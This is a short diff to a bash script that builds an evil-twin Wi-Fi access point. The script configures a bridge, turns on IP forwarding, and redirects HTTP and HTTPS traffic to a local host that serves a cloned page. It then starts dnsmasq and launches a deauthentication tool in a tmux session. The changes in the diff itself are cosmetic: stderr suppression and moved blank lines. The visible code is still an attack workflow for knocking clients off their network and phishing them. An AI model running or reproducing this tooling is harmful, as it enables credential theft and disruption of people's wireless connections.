@@ -89,7 +89,7 @@ echo ""
 ifconfig br0 up
 sleep 2
 ifconfig br0 10.1.1.1 netmask 255.255.255.0
-sysctl net.ipv4.ip_forward=1
+sysctl net.ipv4.ip_forward=1 2>/dev/null
 echo ""
 echo -e ${green}"Copying Redirect Into Cloned Page"${clear}
 echo ""
@@ -103,16 +103,15 @@ iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-desti
 iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
 iptables -t nat -A POSTROUTING -j MASQUERADE
 sleep 2
-echo ""
 echo -e ${green}"Starting DNS"${clear}
 service dnsmasq start
 sleep 4
+echo ""
 echo -e ${red}"Access Point Should Be Up. Time To Deauth"${clear}
 echo ""
 sleep 2
 echo -e ${red}"Press CTRL+B then press D to disconnect TMUX Session Once Deauth Is Started"${clear}
 echo ""
 sleep 2
-echo ""
 read -p "Press enter once you understand how to disconnect from the TMUX session"
 tmux new-session -s deauth 'cd PwrDeauther && sudo bash PwrDeauther.sh'
